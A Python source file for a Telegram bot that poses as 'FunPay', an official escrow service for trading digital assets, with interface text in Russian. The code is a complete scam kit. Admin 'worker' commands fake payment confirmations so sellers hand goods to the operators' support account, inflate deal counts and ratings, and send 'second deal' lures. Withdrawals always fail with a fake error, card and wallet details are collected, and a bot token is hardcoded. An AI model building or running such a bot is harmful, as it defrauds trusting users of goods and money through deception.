import asyncio
import random
import string
import json
import os
import re
import logging
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, InputFile, CallbackQuery
from aiogram.dispatcher import Dispatcher, FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher.filters import Command
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor
from aiohttp import ClientError, ServerDisconnectedError

logging.basicConfig(level=logging.INFO)

TOKEN = "8777636883:AAHVOgPubVWJTn52rEjJZDP9_B03EKwYORw"
SUPPORT_USERNAME = "MalonGarant"
ADMINS_FILE = "admins.txt"
DEALS_FILE = "deals.json"
USERS_FILE = "users.json"
GIF_FILE = "gif/video.mp4"

EMOJIS = {
    "star": "5463071033256848094",
    "check": "5237699328843200968",
    "cross": "5210952531676504517",
    "bell": "5458603043203327669",
    "pen": "5197269100878907942",
    "fire": "5956315789177919502",
    "fire2": "5956016438547325765",
    "bank": "5350548830041415279",
    "sos": "5391112412445288650",
    "globe": "5447410659077661506",
    "exclaim": "5314504236132747481",
    "arrow_up": "5445355530111437729",
    "skull": "5411233191765759009",
    "plus": "5397916757333654639",
    "arrow_left": "5363813939614327183",
    "gear": "5404574751211419858",
    "chart": "5231200819986047254",
    "chat": "5467538555158943525",
    "link": "5271604874419647061",
    "exclaim2": "5440660757194744323",
    "comet": "5224607267797606837",
    "rocket": "5195033767969839232",
    "money": "5287231198098117669",
    "rocket2": "5145427681680032825",
    "pin": "5397782960512444700"
}

def premium_emoji(emoji_id):
    return f"<tg-emoji emoji-id='{emoji_id}'>️</tg-emoji>"

storage = MemoryStorage()
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=storage)

class DealStates(StatesGroup):
    choose_currency = State()
    enter_amount = State()
    enter_description = State()

class RequisitesStates(StatesGroup):
    choose_type = State()
    enter_gram = State()
    enter_card = State()

def init_files():
    for f in [DEALS_FILE, USERS_FILE]:
        if not os.path.exists(f):
            with open(f, 'w') as file:
                json.dump({}, file)
    if not os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'w') as f:
            f.write("")
    if not os.path.exists("gif"):
        os.makedirs("gif")

init_files()

def load_deals():
    with open(DEALS_FILE, 'r') as f:
        return json.load(f)

def save_deals(deals):
    with open(DEALS_FILE, 'w') as f:
        json.dump(deals, f)

def load_users():
    with open(USERS_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_admins():
    with open(ADMINS_FILE, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def generate_deal_id():
    return ''.join(random.choices(string.hexdigits.lower(), k=8))

def generate_referral():
    return ''.join(random.choices(string.hexdigits.lower(), k=16))

def validate_gram_wallet(wallet):
    if not wallet.startswith("UQ"):
        return False
    if len(wallet) < 40 or len(wallet) > 50:
        return False
    if not re.match(r'^[A-Za-z0-9]+$', wallet):
        return False
    return True

def validate_card(card):
    card = card.replace(" ", "")
    if not card.isdigit():
        return False
    if len(card) != 16:
        return False
    return True

async def safe_send(target, text, reply_markup=None, parse_mode="HTML", edit=False, retry=5):
    for attempt in range(retry):
        try:
            if edit:
                await target.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            else:
                if os.path.exists(GIF_FILE):
                    try:
                        await target.answer_video(
                            video=InputFile(GIF_FILE),
                            caption=text,
                            reply_markup=reply_markup,
                            parse_mode=parse_mode
                        )
                        return
                    except:
                        pass
                await target.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
            return
        except (ServerDisconnectedError, ClientError) as e:
            if attempt < retry - 1:
                await asyncio.sleep(1)
                continue
            else:
                try:
                    if edit:
                        await target.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                    else:
                        await target.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
                except:
                    pass
        except:
            pass

def main_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['pen'])} Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['star'])} Профиль", callback_data="profile")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['money'])} Вывод", callback_data="withdraw")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['bank'])} Реквизиты", callback_data="requisites")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['globe'])} Рефералы", callback_data="referrals")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['globe'])} Язык", callback_data="language")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['sos'])} Поддержка", callback_data="support")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="GRAM", callback_data="cur_gram")],
        [InlineKeyboardButton(text="Карта", callback_data="cur_card")],
        [InlineKeyboardButton(text="Звёзды", callback_data="cur_stars")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]
    ])

def requisites_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['plus'])} Добавить GRAM", callback_data="add_gram")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['plus'])} Добавить карту", callback_data="add_card")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]
    ])

def deal_actions_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_up'])} Поделиться ссылкой", callback_data=f"share_{deal_id}")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['cross'])} Отмена", callback_data=f"cancel_deal_{deal_id}")]
    ])

def buyer_deal_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['sos'])} Поддержка", callback_data=f"support_deal_{deal_id}")]
    ])

def admin_buy_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['skull'])} Трахнуть мамонта", callback_data=f"confirm_pay_{deal_id}")]
    ])

def confirm_transfer_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['check'])} Подтвердить передачу", callback_data=f"confirm_transfer_{deal_id}")]
    ])

def final_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['check'])} Подтвердить передачу", callback_data=f"final_confirm_{deal_id}")]
    ])

@dp.message_handler(commands=['start'])
async def cmd_start(message: Message):
    args = message.get_args()
    if args and args.startswith("start="):
        deal_id = args.split("=")[1]
        deals = load_deals()
        if deal_id in deals:
            deal = deals[deal_id]
            text = f"""<b>Сделка #{deal_id}:</b>
<b>Сумма:</b> {deal['amount']} {deal['currency']}
<b>Описание:</b> {deal['description']}
<b>Комиссия:</b> 3.0%

<b>Реквизиты для оплаты:</b>
{deal['requisites']}

После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!"""
            
            await safe_send(message, text, buyer_deal_keyboard(deal_id))
            
            admins = load_admins()
            for admin in admins:
                try:
                    await bot.send_message(admin, f"{premium_emoji(EMOJIS['bell'])} Покупатель открыл сделку #{deal_id}\nЮзер: {message.from_user.id}")
                except:
                    pass
            return
    
    user_id = str(message.from_user.id)
    users = load_users()
    if user_id not in users:
        users[user_id] = {"balance": 0, "deals": 0, "rating": 0, "reviews": 0}
        save_users(users)
    
    text = f"""> <b>FunPay · Официальная ОТС-платформа</b>

{premium_emoji(EMOJIS['star'])} Мы предоставляем полностью автоматизированный сервис гаранта для безопасного обмена цифровыми активами.

{premium_emoji(EMOJIS['star'])} Почему выбирают нас?
- Средства блокируются в блокчейне — прозрачно и безопасно
- Автоматическая проверка оплаты и передачи товара
- Система рейтинга покупателей и продавцов
- Поддержка 24/7

{premium_emoji(EMOJIS['sos'])} Поддержка: @{SUPPORT_USERNAME}"""
    
    await safe_send(message, text, main_menu_keyboard())
    
    if user_id in load_admins():
        admin_text = f"""<b>Приветствую, воркер!</b>

<b>Наши команды:</b>
{premium_emoji(EMOJIS['money'])} /buy *код-сделки* – для оплаты сделки
{premium_emoji(EMOJIS['chart'])} /set_sdel – для установки успешных сделок
{premium_emoji(EMOJIS['star'])} /set_ret – для установки рейтинга (в профиле)
{premium_emoji(EMOJIS['bell'])} /twodeal *юз/айди* – сообщение о второй сделке
{premium_emoji(EMOJIS['chat'])} /send *текст* *юз/айди* – отправить сообщение
{premium_emoji(EMOJIS['link'])} /chat *юз/айди* – выгрузить историю переписки"""
        await safe_send(message, admin_text, None)

@dp.callback_query_handler(lambda c: c.data == "create_deal")
async def create_deal(callback: CallbackQuery, state: FSMContext):
    text = "<b>Выберите валюту сделки:</b>"
    await safe_send(callback.message, text, currency_keyboard(), edit=True)
    await state.set_state(DealStates.choose_currency)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("cur_"))
async def select_currency(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    currency_name = "GRAM" if currency == "gram" else "RUB" if currency == "card" else "звёздах"
    text = f"<b>Введите сумму сделки в {currency_name}:</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_currency")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await state.set_state(DealStates.enter_amount)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "back_currency")
async def back_currency(callback: CallbackQuery, state: FSMContext):
    text = "<b>Выберите валюту сделки:</b>"
    await safe_send(callback.message, text, currency_keyboard(), edit=True)
    await state.set_state(DealStates.choose_currency)
    await callback.answer()

@dp.message_handler(state=DealStates.enter_amount)
async def enter_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount <= 0:
            await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Сумма должна быть больше 0!", None)
            return
        await state.update_data(amount=amount)
        text = f"<b>Что вы предлагаете за {amount}?</b>"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_amount")]])
        await safe_send(message, text, keyboard)
        await state.set_state(DealStates.enter_description)
    except:
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Введите число!", None)

@dp.callback_query_handler(lambda c: c.data == "back_amount")
async def back_amount(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    currency = data.get('currency', 'gram')
    currency_name = "GRAM" if currency == "gram" else "RUB" if currency == "card" else "звёздах"
    text = f"<b>Введите сумму сделки в {currency_name}:</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_currency")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await state.set_state(DealStates.enter_amount)
    await callback.answer()

@dp.message_handler(state=DealStates.enter_description)
async def enter_description(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = generate_deal_id()
    
    user_id = str(message.from_user.id)
    users = load_users()
    user_data = users.get(user_id, {})
    
    if data['currency'] == 'gram':
        requisites = f"Кошелёк GRAM:\n{user_data.get('gram_wallet', 'Не указан')}"
    elif data['currency'] == 'card':
        requisites = f"Перевод на карту (СБП)\nНомер для перевода:\n{user_data.get('card_number', 'Не указан')}"
    else:
        requisites = f"Перевод звёзд:\n@username"
    
    deal = {
        "seller": user_id,
        "amount": data['amount'],
        "currency": data['currency'].upper() if data['currency'] != 'card' else 'RUB',
        "description": message.text,
        "requisites": requisites,
        "status": "created",
        "buyer": None,
        "created_at": datetime.now().isoformat()
    }
    
    deals = load_deals()
    deals[deal_id] = deal
    save_deals(deals)
    
    link = f"https://t.me/FunPaySafaryBot?start=start={deal_id}"
    
    text = f"""<b>Сделка создана!</b>

<b>Номер сделки: #{deal_id}</b>
<b>Сумма:</b> {data['amount']} {deal['currency']}
<b>Описание:</b> {message.text}

<b>Ссылка для покупателя:</b>
{link}

<b>Отправьте эту ссылку покупателю для совершения оплаты!</b>"""
    
    await safe_send(message, text, deal_actions_keyboard(deal_id))
    await state.finish()

@dp.callback_query_handler(lambda c: c.data.startswith("cancel_deal_"))
async def cancel_deal(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    deals = load_deals()
    if deal_id in deals:
        del deals[deal_id]
        save_deals(deals)
    text = f"<b>Сделка #{deal_id} успешно отменена!</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("share_"))
async def share_deal(callback: CallbackQuery):
    deal_id = callback.data.split("_")[1]
    link = f"https://t.me/FunPaySafaryBot?start=start={deal_id}"
    await safe_send(callback.message, f"{premium_emoji(EMOJIS['link'])} <b>Ссылка на сделку #{deal_id}:</b>\n{link}", None)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "back_main")
async def back_main(callback: CallbackQuery, state: FSMContext):
    await state.finish()
    await cmd_start(callback.message)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "profile")
async def profile(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    users = load_users()
    user = users.get(user_id, {})
    
    text = f"""<b>Профиль:</b>
<b>Баланс:</b> {user.get('balance', 0):.2f} RUB

<b>Успешные сделки:</b> {user.get('deals', 0)}

<b>Уровень:</b> Новичок
<b>Комиссия:</b> 3.0%
<b>Рейтинг:</b> {premium_emoji(EMOJIS['star'])} {user.get('rating', 0):.1f}/5 ({user.get('reviews', 0)})"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['money'])} Вывод", callback_data="withdraw")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]
    ])
    
    await safe_send(callback.message, text, keyboard, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "withdraw")
async def withdraw(callback: CallbackQuery):
    text = f"{premium_emoji(EMOJIS['cross'])} <b>Ошибка вывода!</b>\nТехнические неполадки, попробуйте позже."
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "requisites")
async def requisites(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    users = load_users()
    user = users.get(user_id, {})
    
    text = "<b>Ваши реквизиты:</b>\n\n"
    if 'gram_wallet' in user:
        text += f"GRAM: {user['gram_wallet']}\n"
    if 'card_number' in user:
        text += f"Карта: {user['card_number']}\n"
    if not user.get('gram_wallet') and not user.get('card_number'):
        text += "Реквизиты не добавлены\n"
    
    await safe_send(callback.message, text, requisites_keyboard(), edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "add_gram")
async def add_gram(callback: CallbackQuery, state: FSMContext):
    text = "<b>Укажите адрес кошелька GRAM:</b>\n\nПример: UQBKI2yJpyehGNgrrKdyY5iefbqWrgpdklO_Z6DJD6ZbU1CH"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_requisites")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await state.set_state(RequisitesStates.enter_gram)
    await callback.answer()

@dp.message_handler(state=RequisitesStates.enter_gram)
async def enter_gram_wallet(message: Message, state: FSMContext):
    wallet = message.text.strip()
    
    if not validate_gram_wallet(wallet):
        text = f"""{premium_emoji(EMOJIS['cross'])} <b>Вы указали неверный адрес кошелька GRAM!</b>
{premium_emoji(EMOJIS['exclaim'])} Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст

Пример правильного формата:
UQBKI2yJpyehGNgrrKdyY5iefbqWrgpdklO_Z6DJD6ZbU1CH

<b>Укажите адрес кошелька GRAM:</b>"""
        await safe_send(message, text, None)
        return
    
    user_id = str(message.from_user.id)
    users = load_users()
    if user_id not in users:
        users[user_id] = {"balance": 0, "deals": 0, "rating": 0, "reviews": 0}
    users[user_id]['gram_wallet'] = wallet
    save_users(users)
    
    await safe_send(message, f"{premium_emoji(EMOJIS['check'])} <b>Кошелёк GRAM успешно добавлен!</b>", None)
    await state.finish()
    await cmd_start(message)

@dp.callback_query_handler(lambda c: c.data == "add_card")
async def add_card(callback: CallbackQuery, state: FSMContext):
    text = "<b>Укажите номер карты для СБП:</b>\n\nПример: 1234567890123456"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_requisites")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await state.set_state(RequisitesStates.enter_card)
    await callback.answer()

@dp.message_handler(state=RequisitesStates.enter_card)
async def enter_card_number(message: Message, state: FSMContext):
    card = message.text.strip().replace(" ", "")
    
    if not validate_card(card):
        text = f"""{premium_emoji(EMOJIS['cross'])} <b>Неверный формат карты!</b>
{premium_emoji(EMOJIS['exclaim'])} Номер карты должен содержать ровно 16 цифр

Пример: 1234567890123456

<b>Укажите номер карты:</b>"""
        await safe_send(message, text, None)
        return
    
    user_id = str(message.from_user.id)
    users = load_users()
    if user_id not in users:
        users[user_id] = {"balance": 0, "deals": 0, "rating": 0, "reviews": 0}
    users[user_id]['card_number'] = card
    save_users(users)
    
    await safe_send(message, f"{premium_emoji(EMOJIS['check'])} <b>Карта успешно добавлена!</b>", None)
    await state.finish()
    await cmd_start(message)

@dp.callback_query_handler(lambda c: c.data == "back_requisites")
async def back_requisites(callback: CallbackQuery, state: FSMContext):
    await state.finish()
    await requisites(callback)

@dp.callback_query_handler(lambda c: c.data == "referrals")
async def referrals(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    ref_link = f"https://t.me/FunPaySafaryBot?start=ref_{generate_referral()}"
    
    text = f"""<b>+ Реферальная программа:</b>

<b>Приглашайте друзей и получайте вознаграждение!</b>

<b>Ваша ссылка:</b>
{ref_link}"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]])
    await safe_send(callback.message, text, keyboard, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "language")
async def language(callback: CallbackQuery):
    text = "<b>Select language:\nВыберите язык:</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="English", callback_data="lang_en")],
        [InlineKeyboardButton(text="Русский", callback_data="lang_ru")],
        [InlineKeyboardButton(text=f"{premium_emoji(EMOJIS['arrow_left'])} Назад", callback_data="back_main")]
    ])
    await safe_send(callback.message, text, keyboard, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("lang_"))
async def set_language(callback: CallbackQuery):
    lang = callback.data.split("_")[1]
    await callback.answer(f"Язык установлен: {'English' if lang == 'en' else 'Русский'}")
    await back_main(callback, None)

@dp.callback_query_handler(lambda c: c.data == "support")
async def support(callback: CallbackQuery):
    text = f"{premium_emoji(EMOJIS['sos'])} <b>Поддержка:</b> @{SUPPORT_USERNAME}\nСвяжитесь с нами для решения любых вопросов."
    await safe_send(callback.message, text, None, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("support_deal_"))
async def support_deal(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    text = f"{premium_emoji(EMOJIS['sos'])} <b>Поддержка по сделке #{deal_id}:</b> @{SUPPORT_USERNAME}"
    await safe_send(callback.message, text, None, edit=True)
    await callback.answer()

@dp.message_handler(commands=['buy'])
async def cmd_buy(message: Message):
    admin_id = str(message.from_user.id)
    if admin_id not in load_admins():
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён", None)
        return
    
    args = message.get_args()
    if not args:
        await safe_send(message, "Использование: /buy #номер_сделки", None)
        return
    
    deal_id = args.replace("#", "").strip()
    deals = load_deals()
    if deal_id not in deals:
        await safe_send(message, "Сделка не найдена", None)
        return
    
    deal = deals[deal_id]
    buyer_id = deal.get('buyer')
    if not buyer_id:
        await safe_send(message, "Покупатель не найден", None)
        return
    
    text = f"""<b>Оплата по сделке #{deal_id} успешно получена!</b>
Продавец получил уведомление

<b>Сделка #{deal_id}:</b>
<b>Сумма:</b> {deal['amount']} {deal['currency']}
<b>Описание:</b> {deal['description']}
<b>Комиссия:</b> 3.0%

<b>Статус сделки: покупатель успешно оплатил</b>

Дождитесь, пока продавец передаст товар на аккаунт @{SUPPORT_USERNAME}, а затем подтвердите это в боте!"""
    
    await safe_send(message, text, admin_buy_keyboard(deal_id))

@dp.callback_query_handler(lambda c: c.data.startswith("confirm_pay_"))
async def confirm_pay(callback: CallbackQuery):
    admin_id = str(callback.from_user.id)
    if admin_id not in load_admins():
        await callback.answer(f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён")
        return
    
    deal_id = callback.data.split("_")[2]
    deals = load_deals()
    if deal_id not in deals:
        await callback.answer("Сделка не найдена")
        return
    
    deal = deals[deal_id]
    deal['status'] = 'paid'
    save_deals(deals)
    
    buyer_id = deal.get('buyer')
    if buyer_id:
        try:
            text = f"""<b>Сделка #{deal_id}:</b>
<b>Сумма:</b> {deal['amount']} {deal['currency']}
<b>Описание:</b> {deal['description']}
<b>Комиссия:</b> 3.0%

{premium_emoji(EMOJIS['star'])} <b>Статус сделки: покупатель успешно оплатил</b>
<b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b>

{premium_emoji(EMOJIS['exclaim2'])} @{SUPPORT_USERNAME} {premium_emoji(EMOJIS['exclaim2'])}
<b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b>

В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату. Рекомендуем записывать экран во время передачи товара, чтобы поддержка могла лучше разобраться в ситуации при необходимости."""
            
            await safe_send(bot, buyer_id, text, confirm_transfer_keyboard(deal_id))
        except:
            pass
    
    await safe_send(callback.message, f"{premium_emoji(EMOJIS['check'])} <b>Оплата подтверждена!</b>\nПокупатель уведомлён о необходимости передачи товара.", None, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("confirm_transfer_"))
async def confirm_transfer(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    deals = load_deals()
    if deal_id not in deals:
        await callback.answer("Сделка не найдена")
        return
    
    deal = deals[deal_id]
    deal['status'] = 'seller_transferred'
    save_deals(deals)
    
    admins = load_admins()
    for admin in admins:
        try:
            text = f"""<b>Сделка #{deal_id}:</b>
<b>Сумма:</b> {deal['amount']} {deal['currency']}
<b>Описание:</b> {deal['description']}
<b>Комиссия:</b> 3.0%

<b>Статус сделки: покупатель оплатил, продавец подтвердил передачу товара</b>

Проверьте передачу товара на @{SUPPORT_USERNAME} и подтвердите это в системе бота. После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!"""
            
            await safe_send(bot, admin, text, final_confirm_keyboard(deal_id))
        except:
            pass
    
    await safe_send(callback.message, f"{premium_emoji(EMOJIS['check'])} <b>Продавец подтвердил передачу!</b>\nОжидайте подтверждения от администратора.", None, edit=True)
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("final_confirm_"))
async def final_confirm(callback: CallbackQuery):
    admin_id = str(callback.from_user.id)
    if admin_id not in load_admins():
        await callback.answer(f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён")
        return
    
    deal_id = callback.data.split("_")[2]
    deals = load_deals()
    if deal_id not in deals:
        await callback.answer("Сделка не найдена")
        return
    
    deal = deals[deal_id]
    deal['status'] = 'completed'
    save_deals(deals)
    
    buyer_id = deal.get('buyer')
    if buyer_id:
        try:
            text = f"""<b>Сделка #{deal_id}:</b>
<b>Сумма:</b> {deal['amount']} {deal['currency']}
<b>Описание:</b> {deal['description']}
<b>Комиссия:</b> 3.0%

<b>Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>

<b>Ожидайте поступления оплаты на указанный вами ранее кошелёк!</b>"""
            
            await safe_send(bot, buyer_id, text, None)
        except:
            pass
    
    seller_id = deal.get('seller')
    if seller_id:
        users = load_users()
        if seller_id in users:
            users[seller_id]['deals'] = users[seller_id].get('deals', 0) + 1
            users[seller_id]['balance'] = users[seller_id].get('balance', 0) + deal['amount']
            save_users(users)
    
    await safe_send(callback.message, f"{premium_emoji(EMOJIS['check'])} <b>Сделка #{deal_id} успешно завершена!</b>\nСредства переведены продавцу.", None, edit=True)
    await callback.answer()

@dp.message_handler(commands=['set_sdel'])
async def set_sdel(message: Message):
    admin_id = str(message.from_user.id)
    if admin_id not in load_admins():
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён", None)
        return
    
    args = message.get_args()
    if not args:
        await safe_send(message, "Использование: /set_sdel количество", None)
        return
    
    try:
        count = int(args)
        user_id = str(message.from_user.id)
        users = load_users()
        if user_id not in users:
            users[user_id] = {"balance": 0, "deals": 0, "rating": 0, "reviews": 0}
        users[user_id]['deals'] = count
        save_users(users)
        await safe_send(message, f"{premium_emoji(EMOJIS['check'])} Установлено успешных сделок: {count}", None)
    except:
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Введите число", None)

@dp.message_handler(commands=['set_ret'])
async def set_ret(message: Message):
    admin_id = str(message.from_user.id)
    if admin_id not in load_admins():
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён", None)
        return
    
    args = message.get_args()
    if not args:
        await safe_send(message, "Использование: /set_ret рейтинг", None)
        return
    
    try:
        rating = float(args)
        user_id = str(message.from_user.id)
        users = load_users()
        if user_id not in users:
            users[user_id] = {"balance": 0, "deals": 0, "rating": 0, "reviews": 0}
        users[user_id]['rating'] = rating
        save_users(users)
        await safe_send(message, f"{premium_emoji(EMOJIS['check'])} Установлен рейтинг: {rating}", None)
    except:
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Введите число", None)

@dp.message_handler(commands=['send'])
async def cmd_send(message: Message):
    admin_id = str(message.from_user.id)
    if admin_id not in load_admins():
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён", None)
        return
    
    args = message.get_args()
    if not args:
        await safe_send(message, "Использование: /send текст юз/айди", None)
        return
    
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Укажите текст и ID пользователя", None)
        return
    
    text, target = parts
    try:
        await bot.send_message(target, text)
        await safe_send(message, f"{premium_emoji(EMOJIS['check'])} Сообщение отправлено пользователю {target}", None)
    except:
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Ошибка отправки", None)

@dp.message_handler(commands=['chat'])
async def cmd_chat(message: Message):
    admin_id = str(message.from_user.id)
    if admin_id not in load_admins():
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён", None)
        return
    
    args = message.get_args()
    if not args:
        await safe_send(message, "Использование: /chat юз/айди", None)
        return
    
    await safe_send(message, f"{premium_emoji(EMOJIS['exclaim2'])} Функция логирования чата в разработке", None)

@dp.message_handler(commands=['twodeal'])
async def cmd_twodeal(message: Message):
    admin_id = str(message.from_user.id)
    if admin_id not in load_admins():
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Доступ запрещён", None)
        return
    
    args = message.get_args()
    if not args:
        await safe_send(message, "Использование: /twodeal юз/айди", None)
        return
    
    target = args.strip()
    try:
        await bot.send_message(target, f"{premium_emoji(EMOJIS['bell'])} У вас вторая сделка! Переходите в бота для подтверждения.")
        await safe_send(message, f"{premium_emoji(EMOJIS['check'])} Сообщение о второй сделке отправлено пользователю {target}", None)
    except:
        await safe_send(message, f"{premium_emoji(EMOJIS['cross'])} Ошибка отправки", None)

async def on_startup(dp):
    print("[⚡] RAGE mode activated")
    print("[✅] Бот запущен")

async def on_shutdown(dp):
    await bot.close()

if __name__ == '__main__':
    while True:
        try:
            executor.start_polling(dp, skip_updates=True, on_startup=on_startup, on_shutdown=on_shutdown)
            break
        except Exception as e:
            print(f"[!] Ошибка: {e}. Перезапуск через 5 секунд...")
            import time
            time.sleep(5)
            continue
